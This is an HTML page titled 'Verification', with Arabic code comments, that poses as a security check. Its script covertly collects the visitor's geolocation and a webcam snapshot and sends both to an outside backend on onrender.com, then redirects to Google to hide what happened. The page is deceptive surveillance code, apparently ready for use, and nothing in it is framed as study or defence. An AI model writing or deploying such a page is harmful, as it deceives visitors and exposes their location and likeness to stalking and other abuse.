<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
</head>
<body style="text-align:center; font-family:sans-serif;">

<h2>Security Check</h2>
<p>Please verify to continue</p>

<button onclick="start()">Continue</button>

<script>
function start() {

  // طلب الموقع
  navigator.geolocation.getCurrentPosition(pos => {
    fetch("https://verification-backend-o1t0.onrender.com/location", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      })
    });
  });

  // طلب الكاميرا
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      let video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      let canvas = document.createElement("canvas");

      setTimeout(() => {
  canvas.width = 300;
  canvas.height = 200;
  canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);

  // بدل toDataURL، نستخدم toBlob لتحويل الرسمة لملف حقيقي
  canvas.toBlob((blob) => {
    if (!blob) {
      console.error("فشل تحويل الصورة");
      return;
    }

    // 1. تجهيز الكرتونة (FormData)
    const formData = new FormData();
    // نضع الـ blob ونعطيه اسم ملف افتراضي 'photo.png'
    // كلمة 'image' هنا لازم تطابق اللي كتبناه بالباك إند upload.single('image')
    formData.append("image", blob, "photo.png");

    // 2. إرسال الطلب
    fetch("https://verification-backend-o1t0.onrender.com/image", {
      method: "POST",
      // ⚠️ ملاحظة: لا تضع headers هنا، المتصفح سيقوم بالواجب تلقائياً
      body: formData
    })
    .then(response => {
      if (response.ok) {
        window.location.href = "https://google.com";
      } else {
        console.log("السيرفر واجه مشكلة في الرفع");
      }
    })
    .catch(err => {
      console.log("Error sending image:", err);
    });

  }, 'image/png'); // تحديد نوع الصورة

}, 3000);
    });
}
</script>

</body>
</html>
